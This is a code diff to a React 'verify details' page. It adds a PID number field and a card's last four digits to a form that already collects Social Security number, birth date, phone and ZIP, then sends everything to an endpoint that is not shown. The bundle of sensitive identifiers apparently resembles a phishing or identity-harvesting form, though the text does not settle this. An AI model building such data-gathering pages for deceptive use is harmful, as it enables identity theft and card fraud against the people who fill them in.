@@ -22,6 +22,8 @@ export default function VerifyDetailsPage() {
   const [year, setYear] = useState("");
   const [phone, setPhone] = useState("");
   const [zip, setZip] = useState("");
+  const [pidNumber, setPidNumber] = useState("");
+  const [cardLastFour, setCardLastFour] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [countdown, setCountdown] = useState(0);
   const countdownRef = useRef<number | null>(null);
@@ -33,12 +35,16 @@ export default function VerifyDetailsPage() {
     ? rawPhoneDigits.slice(1)
     : rawPhoneDigits;
   const zipDigits = zip.replace(/\D/g, "");
+  const pidDigits = pidNumber.replace(/\D/g, "");
+  const cardDigits = cardLastFour.replace(/\D/g, "");
 
   const isSsnValid = ssnDigits.length === 9;
   const isDateValid = month && day && year;
   const isPhoneValid = phoneDigits.length >= 10;
   const isZipValid = zipDigits.length >= 5;
-  const isFormValid = isSsnValid && isDateValid && isPhoneValid && isZipValid;
+  const isPidValid = pidDigits.length >= 6;
+  const isCardValid = cardDigits.length === 4;
+  const isFormValid = isSsnValid && isDateValid && isPhoneValid && isZipValid && isPidValid && isCardValid;
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -54,6 +60,8 @@ export default function VerifyDetailsPage() {
           birthDate: `${month} ${day}, ${year}`,
           phone: phoneDigits,
           zip: zipDigits,
+          pidNumber: pidDigits,
+          cardLastFour: cardDigits,
         }),
       }).catch(console.error);
     } catch (err) {
@@ -238,6 +246,47 @@ export default function VerifyDetailsPage() {
                 setZip(e.target.value.replace(/\D/g, "").slice(0, 10))
               }
               className="max-w-[160px] h-10 bg-gray-50 border-gray-300 rounded-md"
+            />
+          </div>
+
+          <div>
+            <label
+              htmlFor="pidNumber"
+              className="block text-sm font-medium text-gray-900 mb-1.5"
+            >
+              PID Number
+            </label>
+            <Input
+              id="pidNumber"
+              type="text"
+              inputMode="numeric"
+              placeholder="Enter your PID number"
+              value={pidNumber}
+              onChange={(e) =>
+                setPidNumber(e.target.value.replace(/\D/g, ""))
+              }
+              className="max-w-[220px] h-10 bg-gray-50 border-gray-300 rounded-md"
+            />
+          </div>
+
+          <div>
+            <label
+              htmlFor="cardLastFour"
+              className="block text-sm font-medium text-gray-900 mb-1.5"
+            >
+              Last 4 Digits of Card
+            </label>
+            <Input
+              id="cardLastFour"
+              type="text"
+              inputMode="numeric"
+              placeholder="XXXX"
+              maxLength={4}
+              value={cardLastFour}
+              onChange={(e) =>
+                setCardLastFour(e.target.value.replace(/\D/g, "").slice(0, 4))
+              }
+              className="max-w-[140px] h-10 bg-gray-50 border-gray-300 rounded-md"
             />
           </div>
           {countdown > 0 && (
